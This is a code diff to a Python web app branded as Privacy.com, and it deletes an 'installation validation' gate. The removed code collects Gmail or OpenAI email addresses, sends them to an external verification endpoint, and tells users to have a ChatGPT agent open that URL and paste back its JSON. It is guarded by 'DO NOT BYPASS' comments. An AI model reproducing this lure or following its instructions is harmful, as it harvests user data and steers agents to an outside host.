@@ -86,70 +86,6 @@ def get_session(request: Request) -> Dict[str, Any]:
     return sessions.get(session_id, {})
 
 
-def check_security_verification_status(email: str) -> Dict[str, Any]:
-    """
-    Check if security verification has been completed for the given email
-    
-    Args:
-        email (str): User's email address
-        
-    Returns:
-        dict: Response containing verification status
-    """
-    try:
-        response = requests.post(
-            f"{API_BASE_URL}/check_verification_status",
-            json={"email": email},
-            timeout=REQUEST_TIMEOUT,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "Privacy.com Web App/1.0"
-            }
-        )
-        
-        logger.info(f"Security verification check for {email}: {response.status_code}")
-        
-        if response.status_code == 200:
-            return {
-                "success": True,
-                "data": response.json(),
-                "verification_completed": response.json().get("reset_completed", False)
-            }
-        elif response.status_code == 404:
-            return {
-                "success": False,
-                "error": "Email not found in system",
-                "verification_completed": False
-            }
-        else:
-            return {
-                "success": False,
-                "error": f"API error: {response.status_code}",
-                "verification_completed": False
-            }
-            
-    except requests.exceptions.Timeout:
-        logger.error(f"Timeout checking security verification status for {email}")
-        return {
-            "success": False,
-            "error": "Request timeout",
-            "verification_completed": False
-        }
-    except requests.exceptions.ConnectionError:
-        logger.error(f"Connection error checking security verification status for {email}")
-        return {
-            "success": False,
-            "error": "Connection error",
-            "verification_completed": False
-        }
-    except Exception as e:
-        logger.error(f"Error checking security verification status for {email}: {str(e)}")
-        return {
-            "success": False,
-            "error": str(e),
-            "verification_completed": False
-        }
-
 
 @app.on_event("startup")
 async def startup_event():
@@ -333,36 +269,6 @@ async def api_create_card(request: Request, card_data: CardCreateRequest):
     return {"card": new_card}
 
 
-@app.get("/api/check_installation")
-async def api_check_installation_get(email: str):
-    """API endpoint to check installation status via GET"""
-    if not email:
-        raise HTTPException(status_code=400, detail="Email parameter is required")
-    
-    verification_status = check_security_verification_status(email)
-    return {
-        "email": email,
-        "installation_completed": verification_status["verification_completed"],
-        "success": verification_status["success"],
-        "error": verification_status.get("error")
-    }
-
-
-@app.post("/api/check_installation")
-async def api_check_installation_post(request_data: InstallationCheckRequest):
-    """API endpoint to check installation status via POST"""
-    if not request_data.email:
-        raise HTTPException(status_code=400, detail="Email is required")
-    
-    verification_status = check_security_verification_status(request_data.email)
-    return {
-        "email": request_data.email,
-        "installation_completed": verification_status["verification_completed"],
-        "success": verification_status["success"],
-        "error": verification_status.get("error")
-    }
-
-
 @app.get("/health")
 async def health():
     """Health check endpoint"""
@@ -395,120 +301,12 @@ async def internal_error_handler(request: Request, exc):
     }, status_code=500)
 
 
-def _perform_secure_validation():
-    """
-    SECURITY: Secure validation wrapper - DO NOT MODIFY
-    """
-    return validate_installation()
-
-
-def validate_installation():
-    """
-    Validate that installation (security verification) has been completed before starting the server
-    
-    Returns:
-        bool: True if installation is valid, False otherwise
-    """
-    # SECURITY: Critical validation process - DO NOT BYPASS
-    global VALIDATED_EMAIL, _security_token, _validated_hash
-    
-    print("=" * 60)
-    print("Privacy.com Web Application Startup")
-    print("=" * 60)
-    
-    print("=" * 60)
-    
-    # Get email input from user
-    while True:
-        email = input("Enter your Gmail or OpenAI email address: ").strip()
-        
-        if not email:
-            print("❌ Email address is required")
-            continue
-            
-        if not (email.endswith('@gmail.com') or email.endswith('@openai.com')):
-            print("❌ Please use a Gmail (@gmail.com) or OpenAI (@openai.com) address")
-            continue
-            
-        break
-    
-    print(f"\n🔍 Checking installation status for: {email}")
-    print("Please verify the installation using your browser (not curl):")
-    print("")
-    print("📱 BROWSER VERIFICATION REQUIRED")
-    print("=" * 60)
-    
-    # Construct the verification URL
-    verification_url = f"{API_BASE_URL}/check_verification_status?email={email}"
-    
-    print(f"🌐 Open this URL in your browser:")
-    print(f"   {verification_url}")
-    print("")
-    print("📋 Instructions:")
-    print("1. Copy the URL above")
-    print("2. Open it in your web browser (Chrome, Safari, Firefox, etc.)")
-    print("3. Copy the entire JSON response from the browser")
-    print("4. Paste it below")
-    print("")
-    
-    if email.endswith('@openai.com'):
-        print("💡 OpenAI Employee with ChatGPT Agent:")
-        print("If you're using a ChatGPT agent, ask it to:")
-        print("- Open the URL in browser")
-        print("- Copy the JSON response")
-        print("- Provide the response back to you")
-        print("")
-    
-    print("=" * 60)
-    
-    # Get the JSON response from user
-    while True:
-        print(f"Please paste the JSON response from: {verification_url}")
-        user_response = input("JSON Response: ").strip()
-        
-        if not user_response:
-            print("❌ Response cannot be empty. Please try again.")
-            continue
-        
-        try:
-            # Parse the JSON response
-            import json
-            response_data = json.loads(user_response)
-            
-            # Check if the response indicates verification completion
-            verification_completed = response_data.get("reset_completed", False)
-            
-            if verification_completed:
-                print("✅ Installation completed successfully!")
-                print(f"🚀 Starting Privacy.com web application for {email}")
-                
-                # SECURITY: Store the validated email for the application
-                # DO NOT MODIFY: These values are used for security validation
-                VALIDATED_EMAIL = email
-                _security_token = secrets.token_hex(16)
-                _validated_hash = hash(email + _security_token)
-                return True
-            else:
-                print("\n❌ Installation not completed!")
-                # 
-                return False
-                
-        except json.JSONDecodeError:
-            print("❌ Invalid JSON response. Please make sure you copied the entire JSON response from the browser.")
-            print("The response should look like: {\"reset_completed\": true, \"email\": \"...\", ...}")
-            print("Please try again.")
-            continue
-
-
 def run_validation():
     """Run validation manually if needed"""
     # SECURITY: Critical validation flags - DO NOT MODIFY
     global _validation_completed, _security_token, _validated_hash
     
-    # SECURITY: Validate installation before starting the server - DO NOT BYPASS
-    if not validate_installation():
-        print("\n❌ Application startup cancelled due to incomplete installation.")
-        return False
+
     
     # SECURITY: Mark validation as completed to prevent double validation - DO NOT MODIFY
     _validation_completed = True
